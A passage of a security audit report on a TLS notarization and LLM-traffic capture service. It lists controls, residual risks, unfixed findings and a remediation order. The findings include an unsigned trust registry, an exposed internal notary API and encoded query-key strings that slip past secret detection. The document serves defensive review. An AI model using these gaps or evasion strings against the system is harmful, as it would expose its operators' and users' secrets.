| Cert binding | `verified_connection_metadata` checks WebPKI for `server_name` before receipt |
| Proxy-TLS only | MPC-TLS commits are rejected |
| Header redaction | Only `transfer-encoding: chunked`; verification re-checks visible header values |
| Request/response bodies | Fully disclosed by design; OTLP built from bodies, not headers (`normalize.rs`) |
| Archive | Fixed six-entry ZIP, Stored-only, enclosed names, per-file SHA-256, byte-identical rewrite |
| Verify | Presentation key, host, timestamp, disclosed bytes, redaction, artifact hashes, OTLP reproduction |
| Capture receipt | `record_digest` / root binding must match session; hosted notarization tickets bind digest + allowance |
| Ticketless core API | `expected_record_digest: None` skips binding — **footgun for custom policies**; platform adapter requires digest |
| Registry | Generation monotonicity, same-generation hash conflict, revocations sticky; document is unsigned |
| Admission tickets | Hashed at rest, single-use under row lock, instance-bound, redacted in `Debug` |
| Device refresh | SHA-256 stored; replay of rotated token revokes the device |
| Stripe webhooks | Signature + timestamp window, livemode check, checkout rebound to DB, event idempotency |
| JSON parse | Vendored spansy patch: iterative strings + nesting cap (stack DoS on transcripts) |
| Hop-by-hop | `Connection`-nominated headers stripped on the proxy |
| Notary frames | 4-byte length prefixed; `validate_frame_length` before allocate |
| Owner APIs | `account_id` bound on trace/device/key/billing queries (no IDOR found in pass 2) |
| SQL | Parameter binds; no string-concat queries found in pass 2 |

**Residual protocol risks (design, not bugs):**

1. **Notary key compromise** signs arbitrary witnessed sessions for allowlisted hosts. No transparency log.
2. **Unsigned registry** over a hijacked HTTPS origin (or H1 attacker origin) replaces trust anchors. Local cache blocks rollback, not first-use substitution.
3. **Cleartext `tcp://` notary** when no admission value is present (self-hosted). Tickets require TLS except loopback.
4. **`daemon-e2e` feature** replaces Mozilla roots via `NOTARYD_E2E_ROOT_CA_DER`. Must never ship in production binaries.
5. **OpenRouter model slugs** are not a vendor origin proof (documented).
6. **TLS 1.2 cert binding** (`CertBinding::V1_2`) — Proxy-TLS profile limitation, not an extra check skipped for TLS 1.3.
7. **Usage `GONE` (410)** on settle deletes the outbox entry (`notary-server-platform-adapter`). Correct if the API means “already settled/gone”; a buggy 410 drops unpaid usage.
8. **Public safety is heuristic.** Hostile nested JSON, homoglyph keys, and split tokens are tested; encoded query keys (H3) are not.
9. **Notarization does not re-check today’s hostname allowlist.** Capture enforces allowlist; sealing only verifies the signed receipt. Shrinking the allowlist does not prevent sealing an existing capture of a delisted host (usually desirable for deferred notarization).
10. **`AttestationRequest` cert commitment** is taken from the client at seal time; `sign_attestation` overlays receipt connection info / ephemeral key. A honest presentation still needs a matching identity opening — not a free cert forge, but a missing capture-time consistency check.
11. **Unchecked `sum::<usize>()`** in `verified_connection_metadata_with_roots` and `ensure_attestable_ranges` vs `checked_add` elsewhere. On 64-bit this is unreachable given prior checked counts; keep it consistent.

---

## Cross-cutting residual risks

- **Cluster vault key** is shared across replicas; one file decrypts every `.llmcapture`.
- **HTTP Basic** on the admin API (when enabled) authenticates without the dashboard CSRF header; cached browser Basic remains a CSRF residual. Cookie sessions use `SameSite=Strict` + `x-notary-request: dashboard` (good).
- **Hosted session cookies** are `SameSite=Lax` (OAuth-friendly); no CSRF token. Mutation POSTs from other sites are blocked by Lax; top-level GET redirects are not (M1).
- **Upload completion** checks size + S3 metadata, not body hash; the worker hashes before admit. Residual: verify-capacity burn with junk objects.
- **`secret-scan.yml`** is `workflow_dispatch` only; CI Gitleaks on PR/push is the real control.
- **Release PAT** (`NOTARY_RELEASE_TOKEN`) blast radius if over-scoped; signing keys in the macOS runner env during `tauri build` are necessary but sensitive.
- **Convenience empty vault** if `desktop-convenience-v1` is planted.

---

## What looks solid

- Remote notary does not receive provider credentials or application plaintext on the happy path (Proxy-TLS + header-value redaction).
- Hop-by-hop stripping, no redirect following on provider and share upload clients, adapter-chosen upstream host.
- Capture-off vs capture-on is snapshotted per request; no silent fallback between paths.
- `.llmcapture` is not on the share upload path; admin APIs are documented/tested to omit decrypted checkpoints.
- Hosted share worker: `FOR UPDATE SKIP LOCKED`, size+SHA-256, verify, public-safety, store, re-download equality, then delete intake.
- Unlisted traces omitted from the public index; missing/expired/wrong-password use a generic 404; dummy Argon2 hash on access attempts.
- API keys: scoped, hashed, constant-time compare; cannot hit billing/key admin.
- Device poll secret ≠ approval secret; user codes are low-entropy by design but useless alone.
- Telemetry module explicitly forbids headers, bodies, credentials, presigned URLs, and checkpoint paths.
- Entrypoint secret copy: no symlinks, `0400`, `umask 077`.
- Updater minisign chain (aside from host unpinning).
- Notary frame reads cap length before allocation; zip archives require an exact Stored entry set and byte-identical rewrite (no zip-slip / zip-bomb path found).
- Owner/device/key/billing queries bind `account_id`; Stripe webhook signature + livemode + DB rebound checkout (no new fraud bug in pass 2).
- No `pull_request_target` + untrusted checkout with secrets in first-party workflows.

---

## Recommended fix order

1. **H1 + H2 + M3 + M11:** Pin API origin and account-link hosts; default-on local admin auth (or a pairing header); refuse foreign `:8788`; `Host` allowlist; never put API URLs in `href` unsanitized.
2. **H7:** Stop publishing `/api/internal/notary/*` on the public Caddy vhost; add network ACL or mTLS.
3. **H4:** Stop putting refresh tokens on argv.
4. **H3:** Decode query keys; entropy-scan request targets; add tests for `api%5Fkey`, `%61pi_key`, `x%2Damz%2Dsignature`.
5. **M1 + H2 URL secret:** Stop putting `approval_secret` in query/`return_to`.
6. **H5:** Verification IP = `resolve_client_ip`.
7. **H6 + M9:** Loopback-publish Compose notary; never ticketless-sign on a public IP.
8. **M12, M13, M14:** Fix leftover `Content-Length`; non-root images; pin CI actions to SHAs.
9. **M2, M5, M6, M8:** Vault file `O_NOFOLLOW`; streaming byte caps; CSP/`frame-ancestors`; destination IP policy.
10. **L1–L8, M7, M10:** Search haystack, `postMessage` origin, Markdown sanitize, updater host pin, metrics auth, Compose secrets/CIDRs, `__Host-` cookies, object cache headers.

---

## Scope notes

- Pass 1 reviewed protocol/evidence, daemon, hosted API, desktop, updater, Compose/Fly.
- Pass 2 additionally reviewed notary framing/`bincode`, HTTP CL/TE residue, owner IDOR/SQLi, cookie flags, public routing of `/api/internal/*`, dashboard URL sinks, Docker `USER`, and GitHub Actions (`pull_request_target`, floating tags, `@claude`).
- Vendored TLSNotary was treated as third-party except the documented spansy stack patches and the Proxy-TLS integration in `notary-core`.
- Not done: live exploitation against production, fuzzing of the notary framing codec, review of every TLSNotary prover/verifier line, or confirmation of Fly IP allocation (`fly ips`).
- Ordinary tests were not re-run; this change adds documentation only.
